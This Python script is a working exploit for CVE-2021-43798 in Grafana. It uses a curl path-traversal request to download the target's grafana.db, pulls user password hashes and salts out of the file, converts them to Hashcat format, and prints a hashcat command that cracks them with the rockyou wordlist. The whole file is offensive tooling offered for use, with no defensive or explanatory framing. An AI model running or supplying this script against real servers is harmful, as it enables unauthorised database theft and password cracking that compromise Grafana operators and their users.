import os
import base64
import subprocess
import argparse

def download_db(ip, port):
    """
    Use curl to exploit the Grafana CVE and download the database.
    """
    url = f"http://{ip}:{port}/public/plugins/zipkin/../../../../../../../../var/lib/grafana/grafana.db"
    print(f"[+] Attempting to download database from {url}")
    command = [
        "curl",
        url,
        "--path-as-is",
        "--output",
        "grafana.db"
    ]
    result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    if result.returncode == 0 and os.path.exists("grafana.db"):
        print("[+] Successfully downloaded grafana.db")
    else:
        print("[-] Failed to download grafana.db. Check the IP/port or target vulnerability.")
        exit(1)

def extract_hashes():
    print("[+] Extracting hashes from grafana.db")
    
    try:
        with open("grafana.db", "rb") as f:
            data = f.read()
        users = []
        for line in data.decode("utf-8", errors="ignore").splitlines():
            if "|" in line and len(line.split("|")) == 3:
                users.append(line.strip())
        
        if not users:
            print("[-] No valid user data found in grafana.db.")
            exit(1)
        
        with open("extracted_hashes.txt", "w") as f:
            for user in users:
                f.write(user + "\n")
        
        print("[+] Extracted hashes saved to extracted_hashes.txt")
    except Exception as e:
        print(f"[-] Error reading grafana.db: {e}")
        exit(1)

def convert_hashes():
    print("[+] Converting hashes to Hashcat format")
    
    try:
        with open("extracted_hashes.txt", "r") as f:
            users = f.readlines()

        with open("decoded.hashes", "w") as f_out:
            for user in users:
                user_properties = user.strip().split("|")
                email = user_properties[0]
                hex_hash = user_properties[1]
                salt = user_properties[2]
                
                decoded_hash = bytes.fromhex(hex_hash)
                hash_b64 = base64.b64encode(decoded_hash).decode("utf-8")
                salt_b64 = base64.b64encode(bytes(salt, "utf-8")).decode("utf-8")
                f_out.write(f"sha256:10000:{salt_b64}:{hash_b64}\n")
        
        print("[+] Converted hashes saved to decoded.hashes")
    except Exception as e:
        print(f"[-] Error converting hashes: {e}")
        exit(1)

def main():
    parser = argparse.ArgumentParser(description="Exploit Grafana CVE for hash extraction")
    parser.add_argument("ip", help="Target IP address")
    parser.add_argument("--port", default="3000", help="Target port (default: 3000)")
    
    args = parser.parse_args()
    
    ip = args.ip
    port = args.port
    
    print("[+] Starting Grafana Exploit - CVE-2021-43798")
    download_db(ip, port)
    extract_hashes()
    convert_hashes()
    print("[+] Exploit completed. Use Hashcat with the following command:")
    print("    hashcat -m 10900 decoded.hashes /usr/share/wordlists/rockyou.txt")

if __name__ == "__main__":
    main()
